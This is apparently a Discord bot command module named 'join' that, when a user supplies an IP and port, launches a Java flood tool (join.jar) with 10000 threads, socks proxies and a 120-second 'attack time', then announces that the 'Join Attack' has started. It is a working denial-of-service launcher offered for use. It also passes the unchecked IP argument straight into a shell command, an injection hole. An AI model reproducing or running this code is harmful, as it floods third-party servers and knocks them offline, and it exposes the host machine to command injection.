const Discord = require('discord.js');
const { MessageEmbed } = require("discord.js");
module.exports = {
    name: "join",
    category: "methods",
    description: "hi",
    run: async (client, message, args) => {
      try{
const noip = new Discord.MessageEmbed()
      .setColor("EEFF00")
	.setTitle('⚡ Thunderye')
	.setDescription("No ip provided!")
	.setFooter('© Thunder - 2021')
	.setThumbnail("https://i.hizliresim.com/ivrg2py.gif")
const noport = new Discord.MessageEmbed()
      .setColor("EEFF00")
	.setTitle('⚡ Thunderye')
	.setDescription("No port provided!")
	.setFooter('© Thunder - 2021')
	.setThumbnail("https://i.hizliresim.com/ivrg2py.gif")
	const nanport = new Discord.MessageEmbed()
      .setColor("EEFF00")
	.setTitle('⚡ Thunderye')
	.setDescription("Port should be a number!")
	.setFooter('© Thunder - 2021')
	.setThumbnail("https://i.hizliresim.com/ivrg2py.gif")
var ip = args[0];
var port = args[1];
if (!ip) return message.channel.send(noip);
if (!port) return message.channel.send(noport);
if (isNaN(port)) return message.channel.send(nanport);
var exec = require('child_process').exec
exec(`start cmd.exe /K java -jar jarfiles/join.jar host=${ip} port=${port} proxiesFile=socks_proxies.txt threads=10000 attackTime=120 exploit=join`, (error, stdout, stderr) => {
});
const embed = new Discord.MessageEmbed()
      .setColor("EEFF00")
	.setTitle('⚡ Thunderye')
	.addField("IP: " +ip+":"+port, "Join Attack started")
	.setFooter('© Thunder - 2021')
	.setImage("https://i.hizliresim.com/ivrg2py.gif")
 message.channel.send(embed);
 console.log("'JOIN' Attack started!")
    } catch (e) {
        console.log(String(e.stack).bgRed)
        return message.channel.send(new MessageEmbed()
            .setTitle(`❌ ERROR | An error occurred`)
            .setDescription(`\`\`\`${e.stack}\`\`\``)
        );
    }
  }
}
